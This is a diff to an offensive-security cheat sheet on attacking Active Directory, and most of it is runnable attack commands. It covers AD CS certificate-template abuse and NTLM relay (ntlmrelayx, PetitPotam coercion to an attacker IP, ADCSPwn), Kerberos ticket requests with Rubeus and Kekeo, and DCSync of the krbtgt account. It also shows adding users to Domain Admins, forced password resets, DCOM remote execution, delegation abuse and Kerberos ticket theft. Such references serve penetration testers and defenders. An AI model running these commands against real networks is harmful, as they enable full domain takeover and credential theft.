+**NOTE**: Look for **EDITF_ATTRIBUTESUBJECTALTNAME2**, **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT**, **ManageCA** flags, and NTLM Relay to AD CS HTTP Endpoints.
+
+
+#### ESC2 - Misconfigured Certificate Templates
+
+Requirements:
+*  Allows requesters to specify a SAN in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)
+
+Exploitation:
+* Find template
+  ```ps1
+  PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'
+  ```
+* Request a certificate specifying the `/altname` as a domain admin like in [ESC1](#esc1---misconfigured-certificate-templates).
+
+
+#### ESC8 - AD CS Relay Attack
+
+> An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.
+
+Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101)
+
+* Version 1: NTLM Relay + Rubeus + PetitPotam
     ```powershell
+    impacket> python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
+    impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate
+    # For a member server or workstation, the template would be "Computer".
+    # Other templates: workstation, DomainController, Machine, KerberosAuthentication
+
+    # Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam 
+    # You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN
+    git clone https://github.com/topotam/PetitPotam
+    python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
+    python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
     python3 dementor.py <listener> <target> -u <username> -p <password> -d <domain>
     python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local
-    ```
-3. Request the TGT using the certificate
-    ```powershell
-    Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
-    Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzCC...<snip>...NfrHtUUXS /ptt
-    ```
-4. Now you can DCSync with the DC machine account
 
+    # Use the certificate with rubeus to request a TGT
+    Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
+    Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt
+
+    # Now you can use the TGT to perform a DCSync
+    mimikatz> lsadump::dcsync /user:krbtgt
+    ```
+
+* Version 2: NTLM Relay + Mimikatz + Kekeo
+    ```powershell
+    impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+    # Mimikatz
+    mimikatz> misc::efs /server:dc.lab.local /connect:<IP> /noauth
+
+    # Kekeo
+    kekeo> base64 /input:on
+    kekeo> tgt::ask /pfx:<BASE64-CERT-FROM-NTLMRELAY> /user:dc$ /domain:lab.local /ptt
+
+    # Mimikatz
+    mimikatz> lsadump::dcsync /user:krbtgt
+    ```
+* Version 3: ADCSPwn
+    ```powershell
+    https://github.com/bats3c/ADCSPwn
+    adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]
+    adcspwn.exe --adcs cs.pwnlab.local
+    adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
+    adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
+    adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local
+
+    # ADCSPwn arguments
+    adcs            -       This is the address of the AD CS server which authentication will be relayed to.
+    secure          -       Use HTTPS with the certificate service.
+    port            -       The port ADCSPwn will listen on.
+    remote          -       Remote machine to trigger authentication from.
+    username        -       Username for non-domain context.
+    password        -       Password for non-domain context.
+    dc              -       Domain controller to query for Certificate Templates (LDAP).
+    unc             -       Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .
+    output          -       Output path to store base64 generated crt.
+    ```
 
 ### Dangerous Built-in Groups Usage
 
@@ -1791,7 +2092,9 @@ ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtr
 #### GenericAll
 
 * **GenericAll on User** : We can reset user's password without knowing the current password
-* **GenericAll on Group** : Effectively, this allows us to add ourselves (the user spotless) to the Domain Admin group : `net group "domain admins" spotless /add /domain`
+* **GenericAll on Group** : Effectively, this allows us to add ourselves (the user spotless) to the Domain Admin group : 
+	* On Windows : `net group "domain admins" spotless /add /domain`
+	* On Linux using the Samba software suite : `net rpc group ADDMEM "GROUP NAME" UserToAdd -U 'AttackerUser%MyPassword' -W DOMAIN -I [DC IP]`
 
 * **GenericAll/GenericWrite** : We can set a **SPN** on a target account, request a TGS, then grab its hash and kerberoast it.
   ```powershell
@@ -1834,15 +2137,20 @@ ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtr
 #### GenericWrite
 
 * Reset another user's password
-
-    ```powershell
-    # https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1
-    $user = 'DOMAIN\user1'; 
-    $pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; 
-    $creds = New-Object System.Management.Automation.PSCredential $user, $pass;
-    $newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; 
-    Set-DomainUserPassword -Identity 'DOMAIN\user2' -AccountPassword $newpass -Credential $creds;
-    ```
+	* On Windows:
+		```powershell
+		# https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1
+		$user = 'DOMAIN\user1'; 
+		$pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; 
+		$creds = New-Object System.Management.Automation.PSCredential $user, $pass;
+		$newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; 
+		Set-DomainUserPassword -Identity 'DOMAIN\user2' -AccountPassword $newpass -Credential $creds;
+		```
+	* On Linux:
+		```bash
+		# Using rpcclient from the  Samba software suite
+		rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
+		```
 
 * WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : `Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1`
 
@@ -1930,6 +2238,13 @@ Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
 
 > DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer.
 
+
+* Impacket DcomExec.py
+  ```ps1
+  dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC] [-object [{ShellWindows,ShellBrowserWindow,MMC20}]] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB] target [command ...]
+  dcomexec.py -share C$ -object MMC20 '<DOMAIN>/<USERNAME>:<PASSWORD>@<MACHINE_CIBLE>'
+  dcomexec.py -share C$ -object MMC20 '<DOMAIN>/<USERNAME>:<PASSWORD>@<MACHINE_CIBLE>' 'ipconfig'
+  ```
 * CheeseTools - https://github.com/klezVirus/CheeseTools
   ```powershell
   # https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/
@@ -2224,6 +2539,22 @@ Then you can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HA
 * Ensure sensitive accounts cannot be delegated
 * Disable the Print Spooler Service
 
+
+#### MS-EFSRPC Abuse with Unconstrained Delegation
+
+Using `PetitPotam`, another tool to coerce a callback from the targeted machine, instead of `SpoolSample`.
+
+```powershell
+# Coerce the callback
+git clone https://github.com/topotam/PetitPotam
+python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
+python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
+
+# Extract the ticket
+.\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
+```
+
+
 ### Kerberos Constrained Delegation
 
 > Request a Kerberos ticket which allows us to exploit delegation configurations, we can once again use Impackets getST.py script, however,
@@ -2238,25 +2569,19 @@ $ Get-DomainComputer -TrustedToAuth | select -exp dnshostname
 $ Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
 ```
 
-#### Exploit with Impacket
-```ps1
-$ getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
-Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+#### Exploit the Constrained Delegation
 
-[*] Getting TGT for user
-[*] Impersonating Administrator
-[*]     Requesting S4U2self
-[*]     Requesting S4U2Proxy
-[*] Saving ticket in Administrator.ccache
-```
-
-#### Exploit with Rubeus
-```ps1
-$ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:...
-$ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
-$ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
-$ dir \\dc.domain.com\c$
-```
+* Impacket
+  ```ps1
+  $ getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
+  ```
+* Rubeus
+  ```ps1
+  $ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:...
+  $ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
+  $ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
+  $ dir \\dc.domain.com\c$
+  ```
 
 #### Impersonate a domain user on a resource
 
@@ -2405,24 +2730,6 @@ python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate U
 
 # Load the ticket
 .\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit | Out-Null
-```
-
-### Relay delegation with mitm6
-
-Prerequisites: 
-- IPv6 enabled (Windows prefers IPV6 over IPv4)
-- LDAP over TLS (LDAPS)
-
-> ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it.
-
-```powershell
-git clone https://github.com/fox-it/mitm6.git 
-cd /opt/tools/mitm6
-pip install .
-
-mitm6 -hw ws02 -d lab.local --ignore-nofqnd
-ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
-then use rubeus with s4u to relay the delegation
 ```
 
 ### PrivExchange attack
@@ -2601,15 +2908,30 @@ Navigate to any web application that is integrated with our AAD domain. Once at 
 
 ### CCACHE ticket reuse from /tmp
 
-List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be reused by setting the environment variable with `export KRB5CCNAME=/tmp/ticket.ccache`
-
 > When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions
+
+List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be reused by setting the environment variable with `export KRB5CCNAME=/tmp/ticket.ccache`. Kerberos ticket name format is `krb5cc_%{uid}` where uid is the user UID. 
+
+```powershell
+$ ls /tmp/ | grep krb5cc
+krb5cc_1000
+krb5cc_1569901113
+krb5cc_1569901115
+
+$ export KRB5CCNAME=/tmp/krb5cc_1569901115
+```
+
 
 ### CCACHE ticket reuse from keyring
 
 Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey
 
 ```powershell
+# Configuration and build
+git clone https://github.com/TarlogicSecurity/tickey
+cd tickey/tickey
+make CONF=Release
+
 [root@Lab-LSV01 /]# /tmp/tickey -i
 [*] krb5 ccache_name = KEYRING:session:sess_%{uid}
 [+] root detected, so... DUMP ALL THE TICKETS!!
@@ -2770,3 +3092,12 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell](https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html)
 * [AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)
 * [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab#Previous%20Work)
+* [Playing with PrintNightmare - 0xdf - Jul 8, 2021](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)
+* [Attacking Active Directory: 0 to 0.9 - Eloy Pérez González - 2021/05/29](https://zer1t0.gitlab.io/posts/attacking_ad/)
+* [Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021](https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/)
+* [Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021](http://www.harmj0y.net/blog/activedirectory/certified-pre-owned/)
+* [NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
+* [Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Certified-Pre-Owned-Abusing-Active-Directory-Certificate-Services.pdf)
+* [Certified Pre-Owned - Will Schroeder - Jun 17 2021](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
+* [AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021](https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/)
+* [NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021](https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)
